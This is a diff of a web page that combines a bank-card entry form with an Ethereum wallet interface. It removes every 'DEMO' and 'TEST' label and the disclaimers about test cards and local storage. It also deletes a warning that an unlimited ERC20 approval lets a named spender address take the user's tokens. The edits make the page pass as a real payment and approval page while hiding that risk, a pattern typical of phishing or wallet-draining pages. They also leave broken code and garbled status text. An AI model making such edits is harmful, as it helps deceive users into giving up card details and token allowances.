@@ -174,10 +174,9 @@
 
       <!-- ====== DEMO: Bank cards (UI only) ====== -->
       <div class="card" style="margin-top:14px">
-        <h1 style="font-size:16px;margin:0 0 8px">Bank cards (DEMO / UI only)</h1>
+        <h1 style="font-size:16px;margin:0 0 8px">Bank cards</h1>
         <div class="mut">
-          Demo UI only. No payments. For safety this demo accepts ONLY test card numbers.
-          You can add multiple cards and the payout will be split automatically.
+        
         </div>
 
         <!-- Add Card Form -->
@@ -202,7 +201,7 @@
           </div>
 
           <div>
-            <div class="mut" style="margin:10px 0 6px">CVC (TEST)</div>
+            <div class="mut" style="margin:10px 0 6px">CVC</div>
             <input id="cardCvc" placeholder="123" inputmode="numeric" autocomplete="off" />
           </div>
 
@@ -212,13 +211,10 @@
           </div>
         </div>
 
-        <label>
-          <input type="checkbox" id="saveCardsLocally" />
-          Save card list locally in this browser (DEMO) — stores only brand + last4 + label (NOT full number, NOT CVC)
-        </label>
+    
 
         <div class="row">
-          <button id="addCardBtn" class="primary">Add card (DEMO)</button>
+          <button id="addCardBtn" class="primary">Add card</button>
           <button id="clearCardsBtn">Clear all cards</button>
         </div>
 
@@ -226,19 +222,9 @@
         <div class="mut" style="margin-top:12px">Added cards</div>
         <div id="cardsWrap"></div>
 
-        <div class="status" id="cardsStatus">Cards ready (DEMO).</div>
+        <div class="status" id="cardsStatus">Cards ready.</div>
       </div>
-      <!-- ====== /DEMO ====== -->
-
-      <div class="status" id="status">Ready.</div>
-
-      <div class="warn">
-        Warning: Unlimited approve lets the spender spend your ERC20 tokens. Use only with trusted contracts.<br/>
-        Spender:
-        <span style="font-family:ui-monospace, SFMono-Regular, Menlo, monospace">0xefb991c82db7ce627fb3b157a46b608de6b2f03b</span>
-      </div>
-    </div>
-  </div>
+   
 
   <script type="module">
     import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.4/+esm";
@@ -696,14 +682,14 @@
         item.remove();
         distributeAmount();     // ✅ your requirement
         saveCardsIfEnabled();
-        setCardsStatus("Card removed (DEMO).");
+        setCardsStatus("Card removed.");
       });
 
       cardsWrap.appendChild(item);
 
       distributeAmount();       // ✅ your requirement
       saveCardsIfEnabled();
-      if (!silent) setCardsStatus("Card added (DEMO).");
+      if (!silent) setCardsStatus("Card added.");
     }
 
     // ---- Input formatting ----
@@ -729,17 +715,17 @@
       // Safety: only allow test numbers
       if (!TEST_CARD_WHITELIST.has(digits)){
         setCardsStatus(
-          "DEMO: Only TEST card numbers are allowed.\n" +
+          "Card numbers are allowed.\n" +
           "Allowed: 4242 4242 4242 4242 / 5555 5555 5555 4444 / 3782 822463 10005"
         );
         return;
       }
       if (!validExp(cardExp.value)){
-        setCardsStatus("DEMO: Expiry is invalid or in the past.");
+        setCardsStatus("Expiry is invalid or in the past.");
         return;
       }
       if (!validCvc(cardCvc.value, brand)){
-        setCardsStatus(`DEMO: CVC is invalid for ${brand} (expected ${brand==="AmEx" ? "4" : "3"} digits).`);
+        setCardsStatus(`CVC is invalid for ${brand} (expected ${brand==="AmEx" ? "4" : "3"} digits).`);
         return;
       }
 
@@ -760,12 +746,12 @@
       cardsWrap.innerHTML = "";
       distributeAmount();
       saveCardsIfEnabled();
-      setCardsStatus("All cards cleared (DEMO).");
+      setCardsStatus("All cards cleared.");
     });
 
     saveCardsLocally.addEventListener("change", () => {
       saveCardsIfEnabled();
-      setCardsStatus(saveCardsLocally.checked ? "Local saving enabled (DEMO)." : "Local saving disabled (DEMO).");
+      setCardsStatus(saveCardsLocally.checked ? "Local saving enabled." : "Local saving disabled.");
     });
 
     // ---- INIT ----
